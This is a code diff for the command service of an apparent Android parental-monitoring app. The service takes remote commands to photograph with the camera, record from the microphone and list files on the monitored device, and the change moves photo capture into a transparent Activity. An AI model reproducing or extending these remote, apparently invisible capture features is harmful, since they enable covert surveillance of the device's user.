@@ -1,19 +1,12 @@
 package com.parentalmonitor.child.services
 
 import android.content.Context
-import android.graphics.ImageFormat
-import android.hardware.camera2.CameraCharacteristics
-import android.hardware.camera2.CameraDevice
-import android.hardware.camera2.CameraManager
-import android.hardware.camera2.CameraCaptureSession
-import android.hardware.camera2.CaptureRequest
-import android.media.ImageReader
+import android.content.Intent
 import android.media.MediaRecorder
 import android.os.Build
 import android.os.Environment
-import android.os.Handler
-import android.os.HandlerThread
 import android.util.Base64
+import com.parentalmonitor.child.activities.CameraCaptureActivity
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.withContext
 import org.json.JSONArray
@@ -21,8 +14,7 @@ import org.json.JSONObject
 import java.io.File
 import java.net.HttpURLConnection
 import java.net.URL
-import java.util.concurrent.CountDownLatch
-import java.util.concurrent.TimeUnit
+
 
 /**
  * Polls the backend for pending remote commands and executes them.
@@ -53,7 +45,13 @@ class RemoteCommandService(private val ctx: Context, private val baseUrl: String
 
         try {
             val result = when (commandType) {
-                "capture_photo"    -> capturePhoto(payload)
+                "capture_photo"    -> {
+                    // Launch transparent Activity — more reliable than Camera2 from a Service
+                    // on OEM devices (Vivo, Xiaomi, OPPO). The Activity reports the result
+                    // directly; we return a placeholder so executeCommand doesn't also report.
+                    launchCameraActivity(token, commandId, payload.optString("camera", "back"))
+                    return // Activity handles reportResult — don't double-report
+                }
                 "list_files"       -> listFiles()
                 "start_mic",
                 "start_recording"  -> startRecording()
@@ -79,107 +77,17 @@ class RemoteCommandService(private val ctx: Context, private val baseUrl: String
         }
     }
 
-    // ── Camera capture (Camera2 API) ──────────────────────────────────────────
+    // ── Camera — delegates to CameraCaptureActivity ──────────────────────────
 
-    @android.annotation.SuppressLint("MissingPermission")
-    private fun capturePhoto(payload: JSONObject): String {
-        if (ctx.checkSelfPermission(android.Manifest.permission.CAMERA)
-            != android.content.pm.PackageManager.PERMISSION_GRANTED) {
-            return """{"type":"error","message":"camera permission not granted"}"""
+    private fun launchCameraActivity(token: String, commandId: String, facing: String) {
+        val intent = Intent(ctx, CameraCaptureActivity::class.java).apply {
+            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+            putExtra(CameraCaptureActivity.EXTRA_COMMAND_ID, commandId)
+            putExtra(CameraCaptureActivity.EXTRA_TOKEN,      token)
+            putExtra(CameraCaptureActivity.EXTRA_BASE_URL,   baseUrl)
+            putExtra(CameraCaptureActivity.EXTRA_FACING,     facing)
         }
-
-        val wantFront = payload.optString("camera", "back") == "front"
-        val facingWanted = if (wantFront) CameraCharacteristics.LENS_FACING_FRONT
-                           else           CameraCharacteristics.LENS_FACING_BACK
-
-        val manager  = ctx.getSystemService(Context.CAMERA_SERVICE) as CameraManager
-        val cameraId = manager.cameraIdList.firstOrNull { id ->
-            manager.getCameraCharacteristics(id)
-                .get(CameraCharacteristics.LENS_FACING) == facingWanted
-        } ?: manager.cameraIdList.firstOrNull()
-          ?: return """{"type":"error","message":"no camera available"}"""
-
-        val chars = manager.getCameraCharacteristics(cameraId)
-        val map   = chars.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
-        val sizes = map?.getOutputSizes(ImageFormat.JPEG) ?: emptyArray()
-        // Pick largest size ≤ 1920 wide for manageable payload
-        val size = sizes.filter { it.width <= 1920 }
-            .maxByOrNull { it.width * it.height }
-            ?: android.util.Size(1280, 720)
-
-        val latch = CountDownLatch(1)
-        var resultJson = """{"type":"error","message":"timeout — camera did not respond in 15 s"}"""
-
-        val thread  = HandlerThread("CameraCapture").also { it.start() }
-        val handler = Handler(thread.looper)
-
-        val imageReader = ImageReader.newInstance(size.width, size.height, ImageFormat.JPEG, 1)
-        imageReader.setOnImageAvailableListener({ reader ->
-            val image = reader.acquireLatestImage() ?: return@setOnImageAvailableListener
-            try {
-                val buffer = image.planes[0].buffer
-                val bytes  = ByteArray(buffer.remaining()).also { buffer.get(it) }
-                val b64    = Base64.encodeToString(bytes, Base64.NO_WRAP)
-                resultJson = """{"type":"photo","data":"$b64","mimeType":"image/jpeg","width":${size.width},"height":${size.height}}"""
-            } finally {
-                image.close()
-                latch.countDown()
-            }
-        }, handler)
-
-        try {
-            manager.openCamera(cameraId, object : CameraDevice.StateCallback() {
-                override fun onOpened(device: CameraDevice) {
-                    device.createCaptureSession(
-                        listOf(imageReader.surface),
-                        object : CameraCaptureSession.StateCallback() {
-                            override fun onConfigured(session: CameraCaptureSession) {
-                                val req = device.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE).apply {
-                                    addTarget(imageReader.surface)
-                                    set(CaptureRequest.JPEG_QUALITY, 85.toByte())
-                                    set(CaptureRequest.CONTROL_AF_MODE,
-                                        CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
-                                    set(CaptureRequest.CONTROL_AE_MODE,
-                                        CaptureRequest.CONTROL_AE_MODE_ON)
-                                }
-                                session.capture(req.build(), object : android.hardware.camera2.CameraCaptureSession.CaptureCallback() {
-                                    override fun onCaptureFailed(
-                                        session: CameraCaptureSession,
-                                        request: CaptureRequest,
-                                        failure: android.hardware.camera2.CaptureFailure
-                                    ) {
-                                        resultJson = """{"type":"error","message":"capture failed"}"""
-                                        latch.countDown()
-                                    }
-                                }, handler)
-                            }
-                            override fun onConfigureFailed(session: CameraCaptureSession) {
-                                resultJson = """{"type":"error","message":"camera session config failed"}"""
-                                latch.countDown()
-                            }
-                        }, handler)
-                }
-                override fun onDisconnected(device: CameraDevice) {
-                    device.close()
-                    resultJson = """{"type":"error","message":"camera disconnected"}"""
-                    latch.countDown()
-                }
-                override fun onError(device: CameraDevice, error: Int) {
-                    device.close()
-                    resultJson = """{"type":"error","message":"camera error code $error"}"""
-                    latch.countDown()
-                }
-            }, handler)
-
-            latch.await(15, TimeUnit.SECONDS)
-        } catch (e: Exception) {
-            resultJson = """{"type":"error","message":"${e.message}"}"""
-        } finally {
-            try { imageReader.close() } catch (_: Exception) {}
-            thread.quitSafely()
-        }
-
-        return resultJson
+        ctx.startActivity(intent)
     }
 
     // ── Audio recording ───────────────────────────────────────────────────────
@@ -329,16 +237,28 @@ class RemoteCommandService(private val ctx: Context, private val baseUrl: String
                 setFixedLengthStreamingMode(body.size)
             }
             conn.outputStream.use { it.write(body) }
-            conn.responseCode
+            val code = conn.responseCode
+            if (code != 200 && code != 201) {
+                android.util.Log.w(TAG, "reportResult HTTP $code for $commandId — body size ${body.size} bytes")
+                try { android.util.Log.w(TAG, "response: ${conn.errorStream?.bufferedReader()?.readText()}") } catch (_: Exception) {}
+            } else {
+                android.util.Log.d(TAG, "reportResult $status for $commandId ✓")
+            }
             conn.disconnect()
-        } catch (_: Exception) {}
+        } catch (e: Exception) {
+            android.util.Log.w(TAG, "reportResult exception for $commandId: ${e.message}")
+        }
     }
 
-    private fun escapeForJson(raw: String): String {
-        // resultJson is already valid JSON — wrap as a JSON string value only if it's not an object/array
-        return if (raw.startsWith("{") || raw.startsWith("[")) raw
-               else "\"${raw.replace("\\", "\\\\").replace("\"", "\\\"")}\""
-    }
+
+    // The backend 'result' field is typed as String — ALWAYS wrap as a JSON string,
+    // never embed a raw object. Without this, Zod returns 400 and the command
+    // stays at "delivered" forever with no error surfaced to the admin.
+    private fun escapeForJson(raw: String): String =
+        "\"${raw.replace("\\", "\\\\")
+                .replace("\"", "\\\"")
+                .replace("\n", "\\n")
+                .replace("\r", "\\r")}\""
 
     // ── HTTP helper ───────────────────────────────────────────────────────────
 
@@ -357,6 +277,7 @@ class RemoteCommandService(private val ctx: Context, private val baseUrl: String
     }
 
     companion object {
+        private const val TAG     = "RemoteCommandService"
         const val PREFS_COMMANDS  = "pm_commands"
         const val KEY_GEOFENCES   = "geofence_zones"
         const val KEY_BLOCKED_APPS = "blocked_apps"
